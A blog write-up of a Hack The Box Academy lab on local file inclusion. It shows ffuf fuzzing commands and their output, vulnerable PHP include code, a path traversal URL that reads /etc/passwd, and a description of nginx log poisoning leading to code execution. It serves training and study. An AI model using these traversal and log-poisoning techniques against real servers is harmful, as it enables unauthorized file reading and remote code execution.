---
title: HTB Academy File Inclusion Skills Assessment
date: 2024-10-13 22:20:03 
categories: [Cybersecurity, HTB, Web Application Security, Penetration Testing, CTF]
tags:
  [local file inclusion, lfi, path traversal, log poisoning, ffuf, burp suite, rce]
---

## Identifying the Local File Inclusion (LFI) Vulnerability

While working on the skills assessment for the File Inclusion module, I first checked whether the target website was vulnerable to Local File Inclusion (LFI). The website had a query parameter called page in the URL, as shown below:

- `http://<IP>/index.php?page=<page name>`

When I attempted to traverse directories using relative paths, like `../../../../etc/passwd`, I encountered an error message: "**Invalid input detected!**".

## Directory Enumeration with ffuf

To explore available pages on the site, I used the ffuf tool to fuzz the directories:

`ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.255.196:43781/FUZZ.php
`
The results provided me with several pages, such as about.php, contact.php, and error.php. This gave me more insight into the structure of the site:


```
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.255.196:43781/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://83.136.255.196:43781/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 15829, Words: 3435, Lines: 401, Duration: 100ms]
# directory-list-2.3-small.txt [Status: 200, Size: 15829, Words: 3435, Line
about                   [Status: 200, Size: 10313, Words: 2398, Lines: 214,
#                       [Status: 200, Size: 15829, Words: 3435, Lines: 401,
# This work is licensed under the Creative Commons [Status: 200, Size: 1582
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 20
#                       [Status: 200, Size: 15829, Words: 3435, Lines: 401,
# on at least 3 different hosts [Status: 200, Size: 15829, Words: 3435, Lin
contact                 [Status: 200, Size: 2714, Words: 773, Lines: 78, Du
# Copyright 2007 James Fisher [Status: 200, Size: 15829, Words: 3435, Lines
#                       [Status: 200, Size: 15829, Words: 3435, Lines: 401,
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200,
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Si
index                   [Status: 200, Size: 15829, Words: 3435, Lines: 401,
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 158
# Priority-ordered case-sensitive list, where entries were found [Status: 2
main                    [Status: 200, Size: 11507, Words: 2639, Lines: 284,
industries              [Status: 200, Size: 8082, Words: 2018, Lines: 197, 
error                   [Status: 200, Size: 199, Words: 41, Lines: 10, Dura
:: Progress: [87664/87664] :: Job [1/1] :: 393 req/sec :: Duration: [0:03:5
```


## Analyzing the Source Code for Clues

### PHP Source Code Review - Trying PHP Filters

By viewing the source code of the `index.php` page, I discovered the following PHP code snippet:

![index.php](https://joonkim0625.github.io/images/file-inclusion/screenshot_2024-10-12_233448.png)

Base64 decoded source code:

```php
<?php
if(!isset($_GET['page'])) {
  include "main.php";
}
else {
  $page = $_GET['page'];
  if (strpos($page, "..") !== false) {
    include "error.php";
  }
  else {
    include $page . ".php";
  }
}
?>

```

This showed that the page was using the include function to dynamically load different PHP pages. While the script includes a basic check to prevent directory traversal (strpos($page, "..")), there might still be ways to bypass this.

## Unused Admin Page

While exploring further, I found a commented-out section in the PHP source code:

```php
 <?php 
	  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
?>

```

Although commented out, it suggested an `admin` page might exist, which could be a potential target for further investigation.

## Exploiting the Admin Page for LFI
### Bypassing Path Traversal Protection

When I accessed the admin page at:

```
http://83.136.254.47:31827/ilf_admin/index.php?log=../../../../../etc/passwd
```

It appeared that the path traversal protection was missing on this page, as I was able to successfully read /etc/passwd.

![read-passwd](https://joonkim0625.github.io/images/file-inclusion/screenshot_2024-10-13_010132.png)


I used `ffuf` again to search for files that could be accessed via LFI on this page:

```
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-WordList-Linux.txt:FUZZ -u 'http://83.136.254.47:31827/ilf_admin/index.php?log=../../../../../FUZZ' -fs 2046 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://83.136.254.47:31827/ilf_admin/index.php?log=../../../../../FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-WordList-Linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2046
________________________________________________

:: Progress: [1/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00::: Progress: [40/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [44/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [63/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00/etc/ca-certificates.conf [Status: 200, Size: 7659, Words: 163, Lines: 242, Duration: 104ms]
:: Progress: [72/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [82/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [128/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/fstab              [Status: 200, Size: 2135, Words: 154, Lines: 104, Duration: 100ms]
:: Progress: [128/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/group-             [Status: 200, Size: 2761, Words: 150, Lines: 151, Duration: 99ms]
:: Progress: [132/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/group              [Status: 200, Size: 2766, Words: 150, Lines: 151, Duration: 100ms]
:: Progress: [134/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/hostname           [Status: 200, Size: 2093, Words: 150, Lines: 103, Duration: 98ms]
:: Progress: [136/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/hosts              [Status: 200, Size: 2290, Words: 155, Lines: 110, Duration: 98ms]
:: Progress: [139/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/inittab            [Status: 200, Size: 2616, Words: 196, Lines: 125, Duration: 97ms]
:: Progress: [163/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/issue              [Status: 200, Size: 2100, Words: 159, Lines: 105, Duration: 100ms]
:: Progress: [167/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [181/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/modules            [Status: 200, Size: 2061, Words: 150, Lines: 104, Duration: 100ms]
:: Progress: [189/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/motd               [Status: 200, Size: 2329, Words: 183, Lines: 112, Duration: 98ms]
:: Progress: [193/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/mtab               [Status: 200, Size: 4332, Words: 260, Lines: 124, Duration: 103ms]
:: Progress: [201/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/nginx/nginx.conf   [Status: 200, Size: 4965, Words: 934, Lines: 196, Duration: 98ms]
:: Progress: [207/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/os-release         [Status: 200, Size: 2210, Words: 153, Lines: 108, Duration: 100ms]
:: Progress: [209/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/passwd             [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 97ms]
:: Progress: [212/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/passwd-            [Status: 200, Size: 3218, Words: 152, Lines: 129, Duration: 98ms]
:: Progress: [214/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/profile            [Status: 200, Size: 2284, Words: 199, Lines: 112, Duration: 99ms]
:: Progress: [233/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [242/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/resolv.conf        [Status: 200, Size: 2152, Words: 155, Lines: 105, Duration: 101ms]
:: Progress: [247/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [282/772] :: Job [1/1] :: 423 req/sec :: Duration: [0/etc/sysctl.conf        [Status: 200, Size: 2099, Words: 157, Lines: 103, Duration: 100ms]
:: Progress: [297/772] :: Job [1/1] :: 399 req/sec :: Duration: [0:: Progress: [325/772] :: Job [1/1] :: 396 req/sec :: Duration: [0:: Progress: [382/772] :: Job [1/1] :: 403 req/sec :: Duration: [0/proc/cpuinfo           [Status: 200, Size: 6858, Words: 758, Lines: 210, Duration: 98ms]
:: Progress: [404/772] :: Job [1/1] :: 396 req/sec :: Duration: [0/proc/self/cmdline      [Status: 200, Size: 2064, Words: 152, Lines: 102, Duration: 97ms]
:: Progress: [405/772] :: Job [1/1] :: 395 req/sec :: Duration: [0/proc/devices           [Status: 200, Size: 2406, Words: 208, Lines: 137, Duration: 99ms]
:: Progress: [406/772] :: Job [1/1] :: 379 req/sec :: Duration: [0/proc/meminfo           [Status: 200, Size: 3549, Words: 665, Lines: 156, Duration: 99ms]
:: Progress: [407/772] :: Job [1/1] :: 380 req/sec :: Duration: [0/proc/self/environ      [Status: 200, Size: 2544, Words: 151, Lines: 102, Duration: 98ms]
:: Progress: [408/772] :: Job [1/1] :: 380 req/sec :: Duration: [0/proc/net/udp           [Status: 200, Size: 2174, Words: 185, Lines: 103, Duration: 100ms]
:: Progress: [409/772] :: Job [1/1] :: 383 req/sec :: Duration: [0:: Progress: [426/772] :: Job [1/1] :: 386 req/sec :: Duration: [0/proc/self/mounts       [Status: 200, Size: 4332, Words: 260, Lines: 124, Duration: 100ms]
:: Progress: [426/772] :: Job [1/1] :: 386 req/sec :: Duration: [0/proc/self/stat         [Status: 200, Size: 2360, Words: 201, Lines: 103, Duration: 101ms]
:: Progress: [427/772] :: Job [1/1] :: 385 req/sec :: Duration: [0/proc/self/status       [Status: 200, Size: 3482, Words: 245, Lines: 159, Duration: 101ms]
:: Progress: [428/772] :: Job [1/1] :: 383 req/sec :: Duration: [0/proc/version           [Status: 200, Size: 2234, Words: 170, Lines: 103, Duration: 100ms]
:: Progress: [428/772] :: Job [1/1] :: 383 req/sec :: Duration: [0/proc/net/tcp           [Status: 200, Size: 145296, Words: 57576, Lines: 1057, Duration: 103ms]
:: Progress: [456/772] :: Job [1/1] :: 377 req/sec :: Duration: [0:: Progress: [481/772] :: Job [1/1] :: 392 req/sec :: Duration: [0:: Progress: [524/772] :: Job [1/1] :: 398 req/sec :: Duration: [0:: Progress: [570/772] :: Job [1/1] :: 394 req/sec :: Duration: [0:: Progress: [619/772] :: Job [1/1] :: 380 req/sec :: Duration: [0:: Progress: [662/772] :: Job [1/1] :: 373 req/sec :: Duration: [0:: Progress: [716/772] :: Job [1/1] :: 381 req/sec :: Duration: [0:: Progress: [751/772] :: Job [1/1] :: 352 req/sec :: Duration: [0:: Progress: [772/772] :: Job [1/1] :: 337 req/sec :: Duration: [0/var/log/nginx/error.log [Status: 200, Size: 4818137, Words: 499546, Lines: 8226, Duration: 165ms]
:: Progress: [772/772] :: Job [1/1] :: 313 req/sec :: Duration: [0/var/log/nginx/access.log [Status: 200, Size: 12453264, Words: 1439410, Lines: 96026, Duration: 281ms]
:: Progress: [772/772] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

```

This revealed that the server used `Nginx`! 

## Achieving Remote Code Execution (RCE)

By inspecting the logs in /var/log/nginx/access.log, I found an opportunity to inject PHP code for a shell. Using Burp Suite, I sent a request that included a PHP shell command, and it worked, allowing me to execute arbitrary commands on the server:


![brup1](https://joonkim0625.github.io/images/file-inclusion/screenshot_2024-10-13_012840.png)

I  was able to successfully retrieve the flag:

![burp2](https://joonkim0625.github.io/images/file-inclusion/screenshot_2024-10-13_013210.png)


## Lessons Learned

### Importance of Reviewing Source Code

One key takeaway from this assessment is the importance of reviewing the source code carefully. Initially, I spent too much time trying to exploit the site without realizing that a vulnerable admin page was clearly hinted at in the source code.

### Automating with Tools

Although I got lucky finding the path traversal vulnerability, using tools like `ffuf` earlier could have saved me time and effort in identifying other possible vulnerabilities.

## Reference

For additional insights, I looked at how others approached this challenge, which was helpful for refining my method: [Solving the Skills Assessment: File Inclusion and Log Poisoning](https://systemweakness.com/solving-the-skills-assessment-file-inclusion-and-log-poisoning-7447b77ca9).



